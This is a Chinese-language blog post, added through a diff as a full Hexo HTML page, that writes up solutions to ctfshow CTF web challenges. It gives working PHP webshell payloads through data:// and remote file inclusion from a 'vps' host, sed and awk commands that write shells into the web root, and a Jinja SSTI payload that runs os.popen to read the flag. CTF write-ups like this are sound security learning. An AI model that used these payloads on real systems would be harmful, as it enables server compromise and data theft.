@@ -1,0 +1,479 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 6.0.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Muse","version":"8.0.0-rc.1","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+  </script>
+
+  <meta name="description" content="dsb 杯web签到：12345678910111213141516171819202122 &lt;?php# -*- coding: utf-8 -*-# @Author: h1xa# @Date:   2022-03-19 12:10:55# @Last Modified by:   h1xa# @Last Modified time: 2022-03-19 13:27:18# @email">
+<meta property="og:type" content="article">
+<meta property="og:title" content="ctfshow单身杯赛后复现">
+<meta property="og:url" content="http://example.com/2022/05/25/ctfshow%E5%8D%95%E8%BA%AB%E6%9D%AF%E8%B5%9B%E5%90%8E%E5%A4%8D%E7%8E%B0/index.html">
+<meta property="og:site_name" content="Simple">
+<meta property="og:description" content="dsb 杯web签到：12345678910111213141516171819202122 &lt;?php# -*- coding: utf-8 -*-# @Author: h1xa# @Date:   2022-03-19 12:10:55# @Last Modified by:   h1xa# @Last Modified time: 2022-03-19 13:27:18# @email">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/images/image-20220525205626802.png">
+<meta property="og:image" content="http://example.com/images/image-20220525201756522.png">
+<meta property="article:published_time" content="2022-05-25T12:57:37.000Z">
+<meta property="article:modified_time" content="2022-05-25T13:00:48.245Z">
+<meta property="article:author" content="Simple">
+<meta property="article:tag" content="比赛复现">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/images/image-20220525205626802.png">
+
+<link rel="canonical" href="http://example.com/2022/05/25/ctfshow%E5%8D%95%E8%BA%AB%E6%9D%AF%E8%B5%9B%E5%90%8E%E5%A4%8D%E7%8E%B0/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>ctfshow单身杯赛后复现 | Simple</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">Simple</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+      <p class="site-subtitle" itemprop="description">所以生命啊，它苦涩如歌</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2022/05/25/ctfshow%E5%8D%95%E8%BA%AB%E6%9D%AF%E8%B5%9B%E5%90%8E%E5%A4%8D%E7%8E%B0/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/logo.jpg">
+      <meta itemprop="name" content="Simple">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Simple">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          ctfshow单身杯赛后复现
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2022-05-25 20:57:37 / 修改时间：21:00:48" itemprop="dateCreated datePublished" datetime="2022-05-25T20:57:37+08:00">2022-05-25</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/" itemprop="url" rel="index"><span itemprop="name">比赛复现</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h1 id="dsb-杯"><a href="#dsb-杯" class="headerlink" title="dsb 杯"></a>dsb 杯</h1><h2 id="web签到："><a href="#web签到：" class="headerlink" title="web签到："></a>web签到：</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># @Author: h1xa</span></span><br><span class="line"><span class="comment"># @Date:   2022-03-19 12:10:55</span></span><br><span class="line"><span class="comment"># @Last Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># @Last Modified time: 2022-03-19 13:27:18</span></span><br><span class="line"><span class="comment"># @email: h1xa@ctfer.com</span></span><br><span class="line"><span class="comment"># @link: https://ctfer.com</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$file</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$file</span>))&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">strrev</span>(<span class="variable">$file</span>)==<span class="variable">$file</span>)&#123;</span><br><span class="line">        <span class="keyword">include</span> <span class="variable">$file</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>strrev() 函数反转字符串。</p>
+<span id="more"></span>
+
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">strrev</span>(<span class="string">&quot;Hello World!&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">输出：</span><br><span class="line">!dlroW olleH </span><br></pre></td></tr></table></figure>
+
+<p>payload1：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file=data://text/plain,&lt;?php eval($_POST[simple]);?&gt;&gt;?;)]elpmis[TSOP_$(lave php?&lt;,nialp/txet//:atad&amp;simple=system(&quot;ls /&quot;);</span><br></pre></td></tr></table></figure>
+
+<p>payload2:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">python起一个HTTP服务</span><br><span class="line">python3 -m http.server 8081</span><br><span class="line">写一个shell.php文件：</span><br><span class="line">&lt;?php</span><br><span class="line">echo system(&#x27;cat /*&#x27;);</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">file=http://vps:8081/1.php?id=11=di?php.1/vps//:ptth</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><img src="/../images/image-20220525205626802.png" alt="image-20220525205626802"></p>
+<h2 id="easyPHP："><a href="#easyPHP：" class="headerlink" title="easyPHP："></a>easyPHP：</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$cmd</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line"><span class="variable">$param</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;param&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$cmd</span>) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$param</span>))&#123;</span><br><span class="line">    <span class="variable">$cmd</span>=<span class="title function_ invoke__">escapeshellcmd</span>(<span class="title function_ invoke__">substr</span>(<span class="variable">$cmd</span>,<span class="number">0</span>,<span class="number">3</span>)).<span class="string">&quot; &quot;</span>.<span class="title function_ invoke__">escapeshellarg</span>(<span class="variable">$param</span>).<span class="string">&quot; &quot;</span>.<span class="keyword">__FILE__</span>;</span><br><span class="line">    <span class="title function_ invoke__">shell_exec</span>(<span class="variable">$cmd</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><strong>escapeshellcmd — shell 元字符转义</strong></p>
+<p><a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/function.escapeshellcmd.php">点击查看官方文档</a></p>
+<p><strong>escapeshellcmd()</strong> 对字符串中可能会欺骗 shell 命令执行任意命令的字符进行转义。 此函数保证用户输入的数据在传送到 exec() 或 system() 函数，或者 执行操作符 之前进行转义。</p>
+<p>反斜线（\）会在以下字符之前插入： <code>&amp;#;</code>|*?~&lt;&gt;^()[]{}$`, <code>\x0A</code> 和 <code>\xFF</code>。 <code>&#39;</code> 和 <code>&quot;</code> 仅在不配对儿的时候被转义。 在 Windows 平台上，所有这些字符以及 <code>%</code> 和 <code>!</code> 字符都会被空格代替。</p>
+<p><strong>escapeshellarg — 把字符串转码为可以在 shell 命令里使用的参数</strong></p>
+<p><strong>escapeshellarg()</strong> 将给字符串增加一个单引号并且能引用或者转码任何已经存在的单引号，这样以确保能够直接将一个字符串传入 shell 函数，并且还是确保安全的。对于用户输入的部分参数就应该使用这个函数。shell 函数包含 exec(), system() 执行运算符 。</p>
+<p><strong>shell_exec — 通过 shell 环境执行命令，并且将完整的输出以字符串的方式返回。</strong></p>
+<p>实在不会，看的WP：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cmd=sed&amp;param=/php\|POST\|exec/!dw1.php</span><br></pre></td></tr></table></figure>
+
+<p>看不懂，去看下sed命令</p>
+<p>这时，就懂这个命令是什么意思了，</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sed &#x27;/php\|POST\|exec/!dw1.php&#x27; fileplace</span><br></pre></td></tr></table></figure>
+
+<p>匹配当前文件中（index.php）带有php,POST,exec的行，然后把其他行删除，把匹配到的行输出到1.PHP中</p>
+<p>那么就会创建一个1.php，且内容为：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$cmd</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line"><span class="variable">$param</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;param&#x27;</span>];</span><br><span class="line">    <span class="title function_ invoke__">shell_exec</span>(<span class="variable">$cmd</span>);</span><br></pre></td></tr></table></figure>
+
+<p>所以我们访问1.php</p>
+<p>并</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cmd=echo &quot;&lt;?php eval(\$_POST[1]);?&gt;&quot;&gt;2.php</span><br></pre></td></tr></table></figure>
+
+<p>所以又写了个shell到2.php中</p>
+<p>可以利用：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1=system(&#x27;cat /f*&#x27;);</span><br></pre></td></tr></table></figure>
+
+<p>在本机实验的时候发现其实下面这个payload也行，不过思路都一样：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cmd=sed&amp;param=/php\|POST\|exec/w1.php</span><br><span class="line">cmd=<span class="keyword">echo</span> <span class="string">&quot;&lt;?php eval(\$_POST[1]);?&gt;&quot;</span>&gt;<span class="number">2</span>.php</span><br><span class="line"><span class="number">1</span>=<span class="title function_ invoke__">system</span>(<span class="string">&#x27;cat /f*&#x27;</span>);</span><br></pre></td></tr></table></figure>
+
+<p>之后在kali中测试老是不成功，</p>
+<p>会报错：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sed: -e expression #1, char 20: extra characters after command</span><br></pre></td></tr></table></figure>
+
+<p>看到群里大佬的解释：是因为版本不同，所以不能执行，靶机上的版本是4.0,而kali上是4.7+，所以不一样了，解决办法是在命令参数之间加<code>;</code>即：sed ‘&#x2F;php|POST|exec&#x2F;!d;w </p>
+<p>解法二是用awk命令写shell：</p>
+<p><a target="_blank" rel="noopener" href="https://gtfobins.github.io/gtfobins/awk/">https://gtfobins.github.io/gtfobins/awk/</a></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cmd=awk&amp;param= BEGIN &#123;print &quot;system($_POST[0]);&quot; &gt;&gt; &quot;/var/www/html/index.php&quot;&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../images/image-20220525201756522.png" alt="image-20220525201756522"></p>
+<h2 id="姻缘测试-："><a href="#姻缘测试-：" class="headerlink" title="姻缘测试 ："></a>姻缘测试 ：</h2><p>一个ssti题：</p>
+<p>查看源代码可以看见提示&#x2F;source</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">自动换行</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">is_hacker</span>(<span class="params">string</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;整那些个花里胡哨的waf有啥用，还不如这一个，直接杜绝SSTI&quot;&quot;&quot;</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;&#123;&quot;</span> <span class="keyword">in</span> string <span class="keyword">and</span> <span class="string">&quot;&#125;&quot;</span> <span class="keyword">in</span> string :</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">False</span></span><br></pre></td></tr></table></figure>
+
+<p>这里用了and，分开执行即可绕过,直接输入a和b可以得到</p>
+<p>payload:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">result?boy_name=&#123;&#123;%<span class="number">27</span>&amp;girl_name=%<span class="number">27.</span>__class__.__base__.__subclasses__()[<span class="number">81</span>].__init__.__globals__.<span class="built_in">__import__</span>(%27os%<span class="number">27</span>).popen(%27cat /flag.txt%<span class="number">27</span>).read()&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="blog："><a href="#blog：" class="headerlink" title="blog："></a>blog：</h2><p>java小白，容我慢慢来</p>
+<p>贴个官方WP：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://ctf-show.feishu.cn/docs/doccntPffNO3VIF0LV6087Nzbnc#ljwzcn</span><br></pre></td></tr></table></figure>
+
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/" rel="tag"># 比赛复现</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2022/05/25/Linux%E4%B8%89%E5%89%91%E5%AE%A2/" rel="prev" title="Linux三剑客">
+      <i class="fa fa-chevron-left"></i> Linux三剑客
+    </a></div>
+      <div class="post-nav-item"></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#dsb-%E6%9D%AF"><span class="nav-number">1.</span> <span class="nav-text">dsb 杯</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#web%E7%AD%BE%E5%88%B0%EF%BC%9A"><span class="nav-number">1.1.</span> <span class="nav-text">web签到：</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#easyPHP%EF%BC%9A"><span class="nav-number">1.2.</span> <span class="nav-text">easyPHP：</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%A7%BB%E7%BC%98%E6%B5%8B%E8%AF%95-%EF%BC%9A"><span class="nav-number">1.3.</span> <span class="nav-text">姻缘测试 ：</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#blog%EF%BC%9A"><span class="nav-number">1.4.</span> <span class="nav-text">blog：</span></a></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="Simple"
+      src="/images/logo.jpg">
+  <p class="site-author-name" itemprop="name">Simple</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">8</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">3</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">6</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2022</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Simple</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://muse.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Muse</a> 强力驱动
+  </div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/muse.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
